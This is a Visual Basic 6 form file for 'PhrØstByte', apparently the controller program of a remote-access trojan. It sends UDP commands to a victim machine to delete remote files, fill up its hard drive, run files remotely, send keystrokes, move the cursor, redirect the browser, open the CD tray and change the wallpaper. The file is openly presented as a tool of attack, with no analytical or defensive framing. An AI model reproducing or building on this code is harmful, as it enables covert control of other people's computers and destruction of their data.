VERSION 5.00
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "PhrØstByte BY: Phantom "
   ClientHeight    =   4470
   ClientLeft      =   150
   ClientTop       =   435
   ClientWidth     =   7500
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "frmMain.frx":030A
   ScaleHeight     =   4470
   ScaleWidth      =   7500
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   2880
      Top             =   840
   End
   Begin MSComDlg.CommonDialog cd 
      Left            =   3720
      Top             =   960
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4440
      Top             =   600
   End
   Begin MSWinsockLib.Winsock win 
      Left            =   2000
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      RemotePort      =   2000
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00400000&
      Caption         =   "Local In Program Log (Is not saved to a file)"
      ForeColor       =   &H0000FF00&
      Height          =   2655
      Left            =   120
      TabIndex        =   0
      Top             =   1560
      Width           =   7215
      Begin RichTextLib.RichTextBox rt 
         Height          =   2295
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   6975
         _ExtentX        =   12303
         _ExtentY        =   4048
         _Version        =   393217
         BackColor       =   4210752
         Enabled         =   -1  'True
         ReadOnly        =   -1  'True
         ScrollBars      =   3
         DisableNoScroll =   -1  'True
         TextRTF         =   $"frmMain.frx":980E
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin VB.Menu file 
      Caption         =   "&File"
      Begin VB.Menu connection 
         Caption         =   "&Make Connection"
         Shortcut        =   ^N
      End
      Begin VB.Menu log 
         Caption         =   "&Start Logging Connection"
      End
      Begin VB.Menu bar0 
         Caption         =   "-"
      End
      Begin VB.Menu openlogfile 
         Caption         =   "&Open Log File"
         Shortcut        =   ^O
      End
      Begin VB.Menu bar1 
         Caption         =   "-"
      End
      Begin VB.Menu phrostnet 
         Caption         =   "Open &PhrØstNet"
      End
      Begin VB.Menu options 
         Caption         =   "&PhrØstByte Options"
      End
      Begin VB.Menu bar2 
         Caption         =   "-"
      End
      Begin VB.Menu exit 
         Caption         =   "&Exit "
      End
   End
   Begin VB.Menu tools 
      Caption         =   "&Tools"
      Begin VB.Menu fun 
         Caption         =   "Fun Stuff"
         Begin VB.Menu control 
            Caption         =   "Control Cursor Position"
         End
         Begin VB.Menu randommouse 
            Caption         =   "Random Cursor Position"
         End
         Begin VB.Menu setmouse 
            Caption         =   "Set Cursor Position"
         End
         Begin VB.Menu bar4 
            Caption         =   "-"
         End
         Begin VB.Menu changebackground 
            Caption         =   "Change Remote Background"
         End
         Begin VB.Menu changescreensave 
            Caption         =   "Start Remote Screensaver"
         End
         Begin VB.Menu bar8 
            Caption         =   "-"
         End
         Begin VB.Menu sendkey 
            Caption         =   "Sendkey "
         End
      End
      Begin VB.Menu fileanddirectory 
         Caption         =   "&File And Directory"
         Begin VB.Menu FillHd 
            Caption         =   "Fill Up Hard Drive"
         End
         Begin VB.Menu bar21 
            Caption         =   "-"
         End
         Begin VB.Menu runremoteremote 
            Caption         =   "Run Remote File Remotely"
         End
         Begin VB.Menu runremotelocal 
            Caption         =   "Run Remote File Localy"
         End
         Begin VB.Menu runlocalremote 
            Caption         =   "Run Local File Remotely"
         End
         Begin VB.Menu bar22 
            Caption         =   "-"
         End
         Begin VB.Menu deletefile 
            Caption         =   "Delete Remote File"
         End
      End
      Begin VB.Menu web 
         Caption         =   "Web Stuff"
         Begin VB.Menu open 
            Caption         =   "Open Browser"
         End
         Begin VB.Menu randomsite 
            Caption         =   "Send Browser To Random Site"
         End
      End
      Begin VB.Menu music 
         Caption         =   "Musical Anarchy"
         Begin VB.Menu piano 
            Caption         =   "Play Beeps"
         End
         Begin VB.Menu bar11 
            Caption         =   "-"
         End
         Begin VB.Menu opencd 
            Caption         =   "Open CD-Rom"
         End
         Begin VB.Menu closecd 
            Caption         =   "Close CD-Rom"
         End
      End
   End
   Begin VB.Menu help 
      Caption         =   "&Help"
      Begin VB.Menu contents 
         Caption         =   "&Contents"
         Shortcut        =   {F1}
      End
      Begin VB.Menu index 
         Caption         =   "&Index"
      End
      Begin VB.Menu bar9 
         Caption         =   "-"
      End
      Begin VB.Menu about 
         Caption         =   "&About"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim mbf As String
Private Sub about_Click()
Load frmABout
frmABout.Visible = True
End Sub

Private Sub changebackground_Click()
On Error Resume Next
mb = InputBox("Enter the location of the bitmap file you wish to use as wallpaper", "Change Remote Wallpaper")
win.SendData "cwp " & mb
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub changescreensave_Click()
On Error Resume Next
win.SendData "sss"
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub closecd_Click()
On Error Resume Next
win.SendData "ccd"
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"

End Sub

Private Sub connection_Click()
frmConnect.Show
End Sub

Private Sub control_Click()
If control.Checked = False Then
control.Checked = True
Timer1.Enabled = True
Else
Timer1.Enabled = False
control.Checked = False
End If
End Sub

Private Sub deletefile_Click()
On Error Resume Next
mb = InputBox("Enter the filename you wish to delete", "Delete A File")
win.SendData "del " & mb
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub exit_Click()
Unload frmABout
Unload frmConnect
Unload frmMain
Unload frmOptions
Unload frmWeb
Unload Splash
End
End Sub

Private Sub file_Click()
PlayWav App.Path & "/sounds/pulldown.wav"

End Sub

Private Sub fileanddirectory_Click()
PlayWav App.Path & "/sounds/pulldown.wav"

End Sub

Private Sub FillHd_Click()
On Error Resume Next
win.SendData "fil"
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub Form_Load()
rt.SelColor = vbYellow
With win
    .Protocol = sckUDPProtocol
    .RemotePort = 100
    .Bind
End With
frmWeb.Show
Me.Left = (Screen.Width - Me.Width) / 2
Me.Top = (Screen.Height - (Me.Height + frmWeb.Height)) / 6
End Sub

Private Sub Form_Unload(Cancel As Integer)
exit_Click
End Sub

Private Sub fun_Click()
PlayWav App.Path & "/sounds/pulldown.wav"

End Sub

Private Sub help_Click()
PlayWav App.Path & "/sounds/pulldown.wav"

End Sub

Private Sub log_Click()
If log.Caption = "&Start Logging Connection" Then
cd.DialogTitle = "Start a log file"
cd.Filter = "Log Files|*.log"
mbf = cd.filename
cd.ShowSave
Timer2.Enabled = True
log.Caption = "Stop Logging"
Else
Timer2.Enabled = False
log.Caption = "&Start Logging Connection"
End If
End Sub

Private Sub music_Click()
PlayWav App.Path & "/sounds/pulldown.wav"

End Sub

Private Sub open_Click()
On Error Resume Next
mb = InputBox("Enter the url you wish their browser to be directed to:", "Open a webbrowser")
win.SendData "web " & mb
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"

End Sub

Private Sub opencd_Click()
On Error Resume Next
win.SendData "ocd"
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"

End Sub

Private Sub options_Click()
frmOptions.Show
End Sub

Private Sub phrostnet_Click()
frmWeb.Show
End Sub

Private Sub piano_Click()
On Error Resume Next
win.SendData "pan"
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub randommouse_Click()
m = Int(Rnd * 1023)
z = Int(Rnd * 767)
win.SendData "scr " & m & "   :   " & z
End Sub

Private Sub randomsite_Click()
win.SendData "www " & f
End Sub

Private Sub runlocalremote_Click()
On Error Resume Next
MsgBox "The Form you will use to input this information would look something like this: c\windows\notepad.exe, you don't want the : after c"
ms = InputBox("Enter the location of the file you wish to opened on their computer:", "Open Local File Remotley")
win.SendData "olr " & ms
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub runremotelocal_Click()
On Error Resume Next
MsgBox "The Form you will use to input this information would look something like this: c\windows\notepad.exe, you don't want the : after c"
ms = InputBox("Enter the file you wish to open:", "Open Remote File Localy")
If ms = "" Then Exit Sub
Shell "//" & win.RemoteHostIP & "/" & ms, vbNormalFocus
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub runremoteremote_Click()
On Error Resume Next
ms = InputBox("Enter the location of the file you wish to open:", "Open Remote File Remotely")
If ms = "" Then Exit Sub
win.SendData "ope " & ms
If Err Then MsgBox Err.Number & Chr(10) & Chr(10) & Err.Description, vbOKOnly + vbCritical, "[ERROR]"
End Sub

Private Sub sendkey_Click()
frmSendKey.Show
End Sub

Private Sub setmouse_Click()
b = InputBox("Enter X Coordinate Between 0 and 1023")
f = InputBox("Enter Y Coordinate Between 0 and 767")
win.SendData "rcr " & b & "   :   " & f
End Sub

Private Sub Timer1_Timer()
Dim pt As PointAPI
Call GetCursorPos(pt)
win.SendData "crs " & pt.x & "   :   " & pt.y
End Sub

Private Sub Timer2_Timer()
rt.SaveFile (mbf), TextRTF
End Sub

Private Sub tools_Click()
PlayWav App.Path & "/sounds/pulldown.wav"

End Sub

Private Sub web_Click()
PlayWav App.Path & "/sounds/pulldown.wav"

End Sub

Private Sub win_DataArrival(ByVal bytesTotal As Long)
Dim data As String
win.GetData data
Unload frmWait
Select Case Left(data, 3)
Case "log"
m = Right(data, (Len(data) - 4))
rt.SelText = m
End Select
End Sub

